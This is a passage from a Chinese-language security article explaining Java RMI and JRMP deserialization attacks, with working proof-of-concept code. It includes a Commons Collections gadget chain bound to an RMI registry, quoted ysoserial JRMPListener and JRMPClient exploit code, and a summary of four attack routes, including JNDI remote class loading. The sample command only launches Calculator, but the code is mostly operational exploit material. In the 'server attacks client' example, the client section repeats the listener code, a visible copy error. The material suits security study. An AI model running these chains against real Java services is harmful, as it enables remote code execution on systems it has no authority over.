                registry.bind("hello",referenceWrapper);
            } catch (RemoteException e) {
                e.printStackTrace();
            } catch (AlreadyBoundException e) {
                e.printStackTrace();
            } catch (NamingException e) {
                e.printStackTrace();
            }
        }
    }
#### 2.2 为什么Registry bind暴露一个服务对象到RmiRegistry会导致Registry服务自身被反序列化RCE
我们先看一个例子：
  * 程序A
    public class App {
      public static void main(String[] args) {
        try {
          LocateRegistry.createRegistry(1099);
        } catch (RemoteException e) {
          e.printStackTrace();
        }
        while(true);
      }
    }
程序A创建了一个1099端口的Registry注册中心
  * 程序B
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import javax.management.BadAttributeValueExpException;
    import java.lang.reflect.*;
    import java.rmi.AlreadyBoundException;
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    public class App3 {
        public static void main(String[] args) {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"/Applications/Calculator.app/Contents/MacOS/Calculator"}),
            };
            Transformer transformer = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            Map ouputMap = LazyMap.decorate(innerMap,transformer);
            TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap,"pwn");
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            try {
                Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
                field.setAccessible(true);
                field.set(badAttributeValueExpException,tiedMapEntry);
                Map tmpMap = new HashMap();
                tmpMap.put("pwn",badAttributeValueExpException);
                Constructor ctor = null;
                ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
                ctor.setAccessible(true);
                InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class,tmpMap);
                Remote remote = Remote.class.cast(Proxy.newProxyInstance(App3.class.getClassLoader(), new Class[] {Remote.class}, invocationHandler));
                Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
                registry.bind("pwn",remote);
            } catch (NoSuchFieldException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            } catch (InstantiationException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            } catch (RemoteException e) {
                e.printStackTrace();
            } catch (AlreadyBoundException e) {
                e.printStackTrace();
            }
        }
    }
熟悉ysoserial的小伙伴会发现，这其实就是一个ysoserial中的一个payload，而当我启动这个程序，并把这个payload对象动态代理成Remote，并注册到Registry注册中心后，注册中心就会被RCE弹出计算器。
为什么会导致这样呢？其实我们不难猜测，既然触发了RCE，那么必然Registry注册中心执行了这段代码，而这段代码怎么从程序B到程序A的呢，这其中必然是registry.bind("pwn",remote)这个方法中的细节，而java对于对象数据的传输，一向都是通过java原生序列化的方式进行，我们可以尝试抓包看看。  
可以清晰的看到，程序B发送了序列化的数据流给程序A，这印证了我前面的猜测。
#### 2.3 为什么使用JRMP能互相对打
在说使用JRMP为什么能互相对打前，我们回顾一下前面第一章写的JRMP的概念“JRMP是一个协议，是用于Java
RMI过程中的协议，只有使用这个协议，方法调用双方才能正常的进行数据交流。”，很明显JRMP是一种协议，它规定了数据是以什么格式、什么形式在RMI的过程进行传输。那就不难理解为什么使用JRMP能互相对打了。
如果说，JRMP协议规定了RMI的时候，传输的数据包含有java原生序列化数据，并且在JRMP的客户端还是服务端，当接收到JRMP协议数据时，都会把序列化的数据进行反序列化的话，那么就不难解析了。
那我们再以一个例子，来讲述如何用JRMP协议使用客户端去打服务端：
  * 服务端
我这里使用了ysoserial的payload直接创建一个JRMP的服务端
    @PayloadTest( skip = "This test would make you potentially vulnerable")
    @Authors({ Authors.MBECHLER })
    public class JRMPListener extends PayloadRunner implements ObjectPayload {
        public UnicastRemoteObject getObject ( final String command ) throws Exception {
            int jrmpPort = Integer.parseInt(command);
            UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[] {
                RemoteRef.class
            }, new Object[] {
                new UnicastServerRef(jrmpPort)
            });
            Reflections.getField(UnicastRemoteObject.class, "port").set(uro, jrmpPort);
            return uro;
        }
        public static void main ( final String[] args ) throws Exception {
            PayloadRunner.runDeserialize = true;
            PayloadRunner.run(JRMPListener.class, new String[] {"8889"});
        }
    }
  * 客户端
接着看ysoserial的exploit目录ysoserial/src/main/java/ysoserial/exploit
    exploit
    ├─JBoss.java
    ├─JMXInvokeMBean.java
    ├─JRMPClassLoadingListener.java
    ├─JRMPClient.java
    ├─JRMPListener.java
    ├─JSF.java
    ├─JenkinsCLI.java
    ├─JenkinsListener.java
    ├─JenkinsReverse.java
    ├─RMIRegistryExploit.java
    └RMIRegistryExploit2.java
其中，我们可以利用JRMPClient.java这个exploit去实现打服务端
    public class JRMPClient {
        public static final void main ( final String[] argsx ) {
            String[] args = new String[] {"127.0.0.1","8889","CommonsCollections6","/Applications/Calculator.app/Contents/MacOS/Calculator"};
            if ( args.length    ");
                System.exit(-1);
            }
            Object payloadObject = Utils.makePayloadObject(args[2], args[3]);
            String hostname = args[ 0 ];
            int port = Integer.parseInt(args[ 1 ]);
            try {
                System.err.println(String.format("* Opening JRMP socket %s:%d", hostname, port));
                makeDGCCall(hostname, port, payloadObject);
            }
            catch ( Exception e ) {
                e.printStackTrace(System.err);
            }
            Utils.releasePayload(args[2], payloadObject);
        }
        ...
    }
我们指定了当通过客户端使用JRMP协议去连接服务端时，使用CommonsCollections6这个payload（反序列化gadget
chain），去RCE。
PS：在jdku121开始，部分class会被过滤，导致大部分payload不能被反序列化，报错：
    一月 07, 2020 4:20:06 下午 java.io.ObjectInputStream filterCheck
    信息: ObjectInputFilter REJECTED: class java.util.HashSet, array length: -1, nRefs: 2, depth: 1, bytes: 75, ex: n/a
具体怎么绕过，网上看着挺多文章分析的。
接着我们再以一个例子，来讲述如何用JRMP协议使用服务端去打客户端：
  * 服务端
    exploit
    ├─JBoss.java
    ├─JMXInvokeMBean.java
    ├─JRMPClassLoadingListener.java
    ├─JRMPClient.java
    ├─JRMPListener.java
    ├─JSF.java
    ├─JenkinsCLI.java
    ├─JenkinsListener.java
    ├─JenkinsReverse.java
    ├─RMIRegistryExploit.java
    └RMIRegistryExploit2.java
我们这里的例子，使用的是ysoserial的JRMPListener.java，并监听9999端口的JRMP连接，当有客户端连上后，会以JRMP的协议格式，把CommonsCollections6的payload发给对方。
    public static final void main ( String[] args ) {
        args = new String[] {"9999", "CommonsCollections6", "/Applications/Calculator.app/Contents/MacOS/Calculator"};
        if ( args.length   ");
            System.exit(-1);
            return;
        }
        final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);
        try {
            int port = Integer.parseInt(args[ 0 ]);
            System.err.println("* Opening JRMP listener on " + port);
            JRMPListener c = new JRMPListener(port, payloadObject);
            c.run();
        }
        catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
        Utils.releasePayload(args[1], payloadObject);
    }
  * 客户端
我这里使用了ysoserial的payload直接创建一个JRMP的客户端，连接127.0.0.1的9999端口
ysoserial.payloads.JRMPClient：
    public static final void main ( String[] args ) {
        args = new String[] {"9999", "CommonsCollections6", "/Applications/Calculator.app/Contents/MacOS/Calculator"};
        if ( args.length   ");
            System.exit(-1);
            return;
        }
        final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);
        try {
            int port = Integer.parseInt(args[ 0 ]);
            System.err.println("* Opening JRMP listener on " + port);
            JRMPListener c = new JRMPListener(port, payloadObject);
            c.run();
        }
        catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
        Utils.releasePayload(args[1], payloadObject);
    }
然后，就能看的计算器弹出来了，顺利RCE。
### 3 打法总结
  1. 打Registry注册中心
通过使用Registry连接到注册中心，然后把gadget chain对象bind注册到注册中心，从而引起注册中心反序列化RCE
  1. 打InitialContext.lookup执行者
通过使用JNDI的实现，也就是rmi或ldap的目录系统服务，在其中放置一个某名称关联的Reference，Reference关联http服务中的恶意class，在某程序InitialContext.lookup目录系统服务后，返回Reference给该程序，使其加载远程class，从而RCE
  1. JRMP协议客户端打服务端
使用JRMP协议，直接发送gadget chain的序列化数据到服务端，从而引起服务端反序列化RCE
  1. JRMP协议服务端打客户端
使用JRMP协议，当客户端连上后，直接返回gadget chain的序列化数据给客户端，从而引起客户端反序列化RCE
### 参考：